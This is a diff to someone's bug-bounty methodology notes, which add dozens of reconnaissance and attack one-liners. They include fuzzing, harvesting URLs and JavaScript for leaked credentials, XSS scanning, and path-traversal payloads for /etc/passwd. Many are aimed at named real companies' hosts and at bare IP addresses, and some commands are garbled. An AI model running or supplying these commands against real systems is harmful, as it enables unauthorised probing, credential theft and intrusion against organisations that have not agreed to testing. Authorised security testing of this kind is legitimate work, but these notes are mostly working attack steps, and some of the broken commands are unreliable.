@@ -4,6 +4,85 @@ Bug Hunting methodology For Beginner
 https://github.com/amrelsagaei/Bug-Bounty-Hunting-Methodology-2025
 https://lostsec.xyz/
 
+git clone --depth=1 --single-branch https://github.com/0xlipon/payloads.git
+
+ffuf -w ~/wordlists/Bug-Bounty-Wordlists/all-files-leaked.txt -u https://something.edu.bdFUZZ
+ffuf -w iis.txt -u https://40.78.107.245/FUZZ -recursion
+ffuf -w ~/wordlists/Bug-Bounty-Wordlists/fuzz.txt -u https://musicimage.xboxlive.com/FUZZ -fs 150
+ffuf -w ~/wordlists/Bug-Bounty-Wordlists/php_files_only.txt -u https://20.86.155.86/FUZZ
+
+gospider -S alive.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | sort -u | tee urls.txt
+
+echo https://api.netgear.com | katana -jc -f qurl -d 5 -c 50 -kf robotstxt,sitemapxml | sed 's/=.*/=/' | uro | tee katana-urls.txt
+waybackurls https://community.sophos.com/ | gf xss | sed 's/=.*/=/' | uro | tee wayback-urls.txt
+cat https://community.sophos.com/ | gau --subs | grep "https://" | grep -v "png\|jpg\|css\|js\|gif\|txt" | grep "=" | uro | tee gau-urls.txt
+
+https://community.sophos.com/api.ashx/v2/cfs/temporary.json?UploadContextId=
+
+./xss0r.exe --get --urls urls.txt --payloads smallpayloads.txt --shuffle --reflection --threads 10
+
+ffuf -w payloads.txt -u "https://www.redbull.com/?rb3Search=FUZZ" -mc 200 -t 40
+
+cat urls.txt | xargs -I {} sh -c 'echo {} | katana -jc -f qurl -d 5 -c 50 -kf robotstxt,sitemapxml -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg | sed "s/=.*/=/" | uro' | tee katana-urls.txt 
+
+subfinder -d sophos.com -all  -recursive > subdomain1.txt
+subdominator -d sophos.com -o output-subdominator.txt
+
+arjun -q -u sophos.com -oT arjun && cat arjun | awk -F'[?&]' '{baseUrl=$1; for(i=2; i<=NF; i++) {split($i, param, "="); print baseUrl "?" param[1] "="}}' | kxss
+
+ffuf -w all-files-leaked.txt -u https://www.privateinternetaccess.comFUZZ
+https://40.78.107.245/%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
+
+echo laboratories.telekom.com | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt
+cat xss_output.txt | grep -oP '^URL: \K\S+' | sed 's/=.*/=/' | sort -u > final.txt
+
+https://laboratories.telekom.com/?s=
+
+katana -u samsung.com -d 5 -jc | grep '\.js$' | tee alljs.txt
+echo www.samsung.com | gau | grep '\.js$' | anew alljs.txt
+cat alljs.txt | httpx-toolkit -mc 200 -o samsung.txt
+cat samsung.txt | jsleaks -s -l -k
+cat samsung.txt | nuclei -t prsnl/credentials-disclosure-all.yaml -c 30
+cat samsung.txt | xargs -I{} bash -c 'echo -e "\ntarget : {}\n" && python lazyegg.py "{}" — js_urls — domains — ips — leaked_creds — local_storage'
+
+https://musicimage.xboxlive.com/swagger.json
+https://musicimage.xboxlive.com/\..\..\..\..\..\..\..\..\..\etc\passwd
+
+https://20.86.155.86/composer.json
+https://20.86.155.86/composer.lock
+https://20.86.155.86/vendor/composer/installed.json
+https://20.86.155.86/vendor/phpunit/phpunit/phpunit
+
+---------------------------------------------------
+grep -vE '^$' algolia.com.txt | sed 's/^\*\.//' | tee subs.txt
+cat algolia.com.txt | httpx-toolkit --random-agent --status-code --title -server -td -cl
+ffuf -w ~/wordlists/Bug-Bounty-Wordlists/all-files-leaked.txt-u https://algosecrets.algolia.comFUZZ
+
+https://builder.algolia.com
+https://crawler.algolia.com/admin/users/login
+
+https://erc-admin.algolia.com
+https://staging-data.us.algolia.com/1/internal/admin/okta/login?&redirect=https://erc-admin.algolia.com/
+
+https://github.com/0xPugal/One-Liners
+shodan search Ssl.cert.subject.CN:"crypto.com" --fields ip_str | anew ips.txt
+cat ips.txt | httpx-toolkit --random-agent --status-code --title -server -td -cl -o status.txt
+shodan parse --fields ip_str,port --separator : org\:Tesla.json.gz
+
+Oneliner:
+gauplus -subs | anew allUrls.txt; grep -i "\.log$" allUrls.txt | anew log.txt; grep -i "\.bak" allUrls.txt | anew bak.txt; grep -i "\.xlsx" allUrls.txt | anew xlsx.txt; grep "=" allUrls.txt | anew allParams.txt; cat allParams.txt | Gxss -c 100 -0 reflected.txt; cat allUrls.txt | gf SQL | anew allsql.txt; cat allParams.txt | qsreplace "| httpx -1; cat allUrls.txt | awk -F[/:] '{print $4}' | anew newSubs.txt; httpx -l allUrls.txt -path "///////../../../../.. /../etc/passwd" -status-code -mc 200 -ms 'root' | anew pathTraversal.txt; httpx -l allUrls.txt -mc 403 | anew 403s.txt; 403bypasser.py -U 403s.txt; cat allUrls.txt | grep -i "\.js$" > jsfiles.txt; while read link; do python3 SecretFinder.py -i "$link"; done <jsfiles.txt
+cat allSubs.txt | gauplus -subs | grep -i "\.xlsx" allUrls.txt | anew xlsx.txt;
+cat allSubs.txt | gauplus -subs | grep -i "\.sql" allUrls.txt | anew sql.txt;
+cat allSubs.txt | gauplus -subs | grep -i "\.log" allUrls.txt | anew log.txt;
+cat allSubs.txt | gauplus -subs | grep -i "\.bak" allUrls.txt |anew bak.txt;
+cat allSubs.txt | gauplus -subs | grep "=" | Gxss -c 100 | anew reflected.txt
+cat allSubs.txt | gauplus -subs | grep "=" urls.txt; httpx -1 url.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 ms 'root:'
+
+cat allSubs.txt | gauplus -subs | qsreplace ""❘ httpx
+cat allSubs.txt | gauplus -subs | grep -i "\.js$" > jsfiles.txt; while read url; dopython3 SecretFinder.py -i "$url"; done<jsfiles.txt
+cat allSubs.txt | gauplus -subs❘ httpx -sc -nc | grep "403\|401" | anew unauthed.txt
+cat allSubs.txt | gauplus -subs❘ httpx -title | grep -i "admin\|login\| dashboard" | anew loginPanel.txt
+
 https://sm4rty.medium.com/hunting-for-bugs-in-file-upload-feature-c3b364fb01ba
 https://github.com/almandin/fuxploider
 
@@ -35,38 +114,29 @@ cat subdomain1.txt subdomain2.txt > subdomains.txt
 Tool-install-(https://github.com/projectdiscovery/naabu)
 naabu -list subdomains.txt -c 50 -nmap-cli 'nmap -sV -sC' -o naabu-full.txt
 
-
 Tool-install -( sudo apt install httpx-toolkit )
 cat subdomains.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt
-
 cat subdomains_alive.txt | wc -l 
 
 Tool-install-(https://github.com/projectdiscovery/katana)
 katana -u subdomains_alive.txt -d 5 -kf -jc -fx -ef woff,pdf,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt
 
-
 cat allurls.txt | grep -E "\.txt|\.log|\.cache|\.secret|\.db|\.backup|\.yml|\.json|\.gz|\.rar|\.zip|\.config"
-
 cat allurls.txt | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep '=' | sed 's/=.*/=/' | sort | uniq > bsqli.txt
-
 
 Tool-install-(https://github.com/Emoe/kxss)(https://github.com/KathanP19/Gxss)
 
 cat allurls.txt | Gxss | kxss | grep -oP '^URL: \K\S+' | sed 's/=.*/=/' | sort -u > xss.txt
 
-
 Tool-install-(https://github.com/tomnomnom/gf)
 cat allurls.txt | gf or | sed 's/=.*/=/' | sort -u > open_redirect.txt
-
 cat allurls.txt | gf lfi | sed 's/=.*/=/' | sort -u > lfi_output.txt
-
 
 Find vul..for blind sqli xss lfi or..ect...
 Tool-install-(https://github.com/coffinxp/loxs)
 cd loxs
 python3 loxs.py 
 chose each payloads and urls files
-
 cat allurls.txt | grep -E "\.js$" >> js.txt
 
 (https://github.com/m4ll0k/SecretFinder)
